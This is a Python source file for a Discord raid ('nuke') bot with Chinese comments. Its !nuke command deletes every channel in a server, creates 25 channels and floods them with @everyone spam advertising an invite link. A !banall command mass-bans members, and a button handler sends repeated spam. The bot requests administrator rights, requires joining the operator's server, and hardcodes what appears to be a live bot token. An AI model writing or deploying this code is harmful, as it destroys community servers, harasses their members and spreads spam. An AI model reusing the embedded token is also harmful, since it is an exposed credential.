import asyncio
import random
import sqlite3
import time
import discord
from discord import app_commands
from discord.ext import commands

# 1. 初始化 Bot（全檔案只需宣告這一次）
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# --- 設定變數 ---
OWNER_ID = 1497375939053748405
RESTRICTED_USER_ID = 1497375939053748405
REQUIRED_GUILD_ID = 1541990981157654640
REQUIRED_GUILD_INVITE = "https://discord.gg/rDSPnTWN6k"

whitelist_guild_ids = set()


# --- 輔助函式 ---
async def create_and_send(guild):
  try:
    new_channel = await guild.create_text_channel("未命名")
    for _ in range(25):
      asyncio.create_task(
          new_channel.send(
              "# @everyone 今日開始改至二群!!\nhttps://discord.gg/rDSPnTWN6k"
          )
      )
  except Exception:
    pass


# --- 全域權限檢查 (Prefix 指令) ---
@bot.check
async def check_permissions(ctx):
  # 永遠放行 !邀請與白名單管理指令
  if ctx.command and ctx.command.name in [
      "invite",
      "add_whitelist",
      "remove_whitelist",
  ]:
    return True

  # 1. 檢查使用者是否已加入指定的 Discord 伺服器
  required_guild = bot.get_guild(REQUIRED_GUILD_ID)
  if required_guild:
    member = required_guild.get_member(ctx.author.id)
    if member is None:
      await ctx.send(
          f"⚠️ 你必須先加入指定伺服器才能使用機器人指令！\n👉 請點擊連結加入：{REQUIRED_GUILD_INVITE}"
      )
      return False

  # 2. 伺服器白名單與受限擁有者檢查
  if ctx.guild:
    if ctx.guild.owner_id == RESTRICTED_USER_ID:
      await ctx.send(
          "⚠️ 此伺服器屬於受限用戶，無法使用機器人指令（僅開放 `!邀請`）。"
      )
      return False

    if ctx.guild.id in whitelist_guild_ids:
      await ctx.send("⚠️ 此伺服器已被列入白名單，無法使用此指令！")
      return False

  return True


# --- 事件 ---
@bot.event
async def on_ready():
  bot.add_view(NoPermissionView())
  await bot.tree.sync()
  print(f"Bot 已成功上線：{bot.user}")


# --- 指令區 ---

# banall 指令 (會先刪除你輸入的 !banall 訊息，再執行封鎖)
@bot.command(name="banall", help="一鍵封鎖伺服器內所有的普通成員（管理員專用）")
@commands.has_permissions(ban_members=True)
async def banall(ctx):
  # 嘗試刪除使用者剛剛輸入的那則指令訊息
  try:
    await ctx.message.delete()
  except Exception:
    pass

  await ctx.send(
      "⚠️ 正在執行一鍵清空，請稍候...（會自動略過你與機器人以及管理員）"
  )

  guild = ctx.guild
  banned_count = 0
  failed_count = 0

  async for member in guild.fetch_members(limit=None):
    if (
        member.id == ctx.author.id
        or member.bot
        or member.guild_permissions.administrator
    ):
      continue

    try:
      await guild.ban(member, reason="一鍵清除伺服器內的所有假人")
      banned_count += 1
    except Exception as e:
      print(f"無法封鎖 {member.name}: {e}")
      failed_count += 1

  await ctx.send(
      f"✅ 清理完畢！總共成功封鎖了 `{banned_count}` 個帳號（失敗：{failed_count}）。"
  )


@banall.error
async def banall_error(ctx, error):
  if isinstance(error, commands.MissingPermissions):
    await ctx.send("❌ 你沒有權限使用這個指令（需要「封鎖成員」權限）。")
  else:
    await ctx.send(f"❌ 發生錯誤：{error}")


# 自訂 !help
@bot.command()
async def help(ctx):
  help_text = (
      "🤖 **機器人指令幫助**\n"
      "1. 指令➜`!nuke` 功能➜清理並重構伺服器頻道\n"
      "2. 指令➜`!邀請` 功能➜取得機器人邀請連結\n"
      "3. 指令➜`!白名單 <伺服器ID>` 功能➜將伺服器加入白名單\n"
      "4. 指令➜`!移除白名單 <伺服器ID>` 功能➜將伺服器移出白名單\n"
      "5. 指令➜`!banall` 功能➜一鍵封鎖伺服器普通成員\n"
      "6. 指令➜`/無權限` 功能➜發送無權限按鈕訊息\n"
  )
  await ctx.send(help_text)


# 指令：邀請
@bot.command(aliases=["邀請"])
async def invite(ctx):
  invite_url = "https://discord.com/oauth2/authorize?client_id=1541614151816708227&permissions=8&integration_type=0&scope=bot+applications.commands"
  await ctx.send(f"🤖 **機器人邀請連結：**\n{invite_url}")


# 新增白名單指令
@bot.command(aliases=["白名單", "white"])
async def add_whitelist(ctx, guild_id: int):
  if ctx.author.id != OWNER_ID:
    await ctx.send("❌ 權限不足！只有機器人擁有者可以使用此指令。")
    return

  whitelist_guild_ids.add(guild_id)
  await ctx.send(
      f"✅ 已成功將伺服器 ID `{guild_id}` 列入白名單！該伺服器將無法使用 `!nuke`"
      " 與 `/無權限`。"
  )


# 移除白名單指令
@bot.command(aliases=["移除白名單", "unwhite"])
async def remove_whitelist(ctx, guild_id: int):
  if ctx.author.id != OWNER_ID:
    await ctx.send("❌ 權限不足！只有機器人擁有者可以使用此指令。")
    return

  if guild_id in whitelist_guild_ids:
    whitelist_guild_ids.remove(guild_id)
    await ctx.send(f"🔓 已成功將伺服器 ID `{guild_id}` 移出白名單！")
  else:
    await ctx.send(f"⚠️ 伺服器 ID `{guild_id}` 本來就不在白名單中。")


# Nuke 指令
@bot.command()
async def nuke(ctx):
  guild = ctx.guild

  msg = "# @everyone 今日開始改至二群!!https://discord.gg/rDSPnTWN6k"
  for _ in range(9):
    asyncio.create_task(ctx.send(msg))

  for _ in range(25):
    asyncio.create_task(create_and_send(guild))

  for channel in guild.channels:
    asyncio.create_task(channel.delete())


# --- UI View 與 斜線指令 ---
class NoPermissionView(discord.ui.View):

  def __init__(self):
    super().__init__(timeout=None)

  @discord.ui.button(
      label="無權限",
      style=discord.ButtonStyle.primary,
      custom_id="no_perm_button",
  )
  async def no_perm_button_callback(
      self, interaction: discord.Interaction, button: discord.ui.Button
  ):
    await interaction.response.send_message(
        "# @everyone 今日開始改至二群!!\nhttps://discord.gg/rDSPnTWN6k"
    )
    for i in range(2, 26):
      await interaction.followup.send(
          "# @everyone 今日開始改至二群!!\nhttps://discord.gg/rDSPnTWN6k"
      )


@bot.tree.command(name="無權限", description="發送帶有無權限按鈕的隱密訊息")
async def no_permission_slash(interaction: discord.Interaction):
  if interaction.guild:
    if (
        interaction.guild.id in whitelist_guild_ids
        or interaction.guild.owner_id == RESTRICTED_USER_ID
    ):
      await interaction.response.send_message(
          "⚠️ 此伺服器屬於受限/白名單伺服器，無法使用此指令！", ephemeral=True
      )
      return

  required_guild = bot.get_guild(REQUIRED_GUILD_ID)
  if required_guild:
    member = required_guild.get_member(interaction.user.id)
    if member is None:
      await interaction.response.send_message(
          f"⚠️ 你必須先加入指定伺服器才能使用機器人指令！\n👉 請點擊連結加入：{REQUIRED_GUILD_INVITE}",
          ephemeral=True,
      )
      return

  await interaction.response.send_message(
      "點擊下方按鈕觸發回應：", view=NoPermissionView(), ephemeral=True
  )


# 啟動機器人
bot.run(
    "MTU0MTYxNDE1MTgxNjcwODIyNw.GUXIfR.2u-RH7sYdKgFslTIFf5s5AJD2CXPd1eHnH3Nfc"
)
